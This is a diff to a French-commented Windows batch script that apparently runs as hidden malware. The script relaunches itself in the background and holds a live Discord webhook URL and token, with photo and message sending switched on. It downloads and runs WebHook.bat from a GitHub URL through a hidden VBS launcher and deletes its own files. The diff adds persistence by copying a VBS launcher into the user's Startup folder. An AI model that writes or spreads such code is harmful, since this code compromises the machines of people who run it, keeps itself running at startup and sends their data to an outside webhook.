@@ -2,7 +2,9 @@
 if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
 setlocal enabledelayedexpansion
 ::salute num 444
-set debutchemin=C:\Users\%username%\Downloads\
+
+
+set debutchemin=C:\Users\%username%\DOneDrive\ONE DRIVE Documents\WebHook\
 
 :: 📌 Définition des variables
 set WEBHOOK_URL=https://discord.com/api/webhooks/1334179975577862215/FQLGLyudyE8QhYH4OS9MoH-5970K2FU1Ug3tCZ0x7KdWJHHjVMXnSjzSsrOdL8yIGfEo
@@ -19,6 +21,7 @@ set chemin=%debutchemin%paserelle.bat
 set chemin_vbs=%debutchemin%lancer_cacheeeeee.vbs
 set URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat
 set DESTINATION=WebHook.bat
+set cheminlancerWebHook=%debutchemin%lancerWebHook.vbs
 
 
 
@@ -33,6 +36,20 @@ set photo=true
 set message=true
     set MESSAGE1=Bonjour
 ::
+
+
+
+
+
+:: Copier le fichier VBS dans le dossier de démarrage
+copy "%cheminlancerWebHook%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+:: Vérifier si l'opération a réussi
+if %ERRORLEVEL%==0 (
+    echo Le fichier lancerWebHook.vbs a ete ajoute au demarrage.
+) else (
+    echo Une erreur est survenue lors de l'ajout du fichier au demarrage.
+)
 
 
 
@@ -132,7 +149,7 @@ echo setlocal enabledelayedexpansion >> "%chemin%"
 echo set "URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat" >> "%chemin%"
 echo set "DESTINATION=%debutchemin%WebHook.bat" >> "%chemin%"
 echo curl -o "%DESTINATION%" "%URL%" > nul 2>&1 >> "%chemin%"
-echo cscript //nologo "%debutchemin%lancerWebHook.vbs" >> "%chemin%"
+echo cscript //nologo "%cheminlancerWebHook%" >> "%chemin%"
 echo del "%chemin_vbs%" >> "%chemin%"
 echo del "%chemin%" >> "%chemin%"
 
@@ -153,6 +170,8 @@ del "%chemin_vbs%"
 del "%~f0"
 
 :finversion
+
+
 
 
 
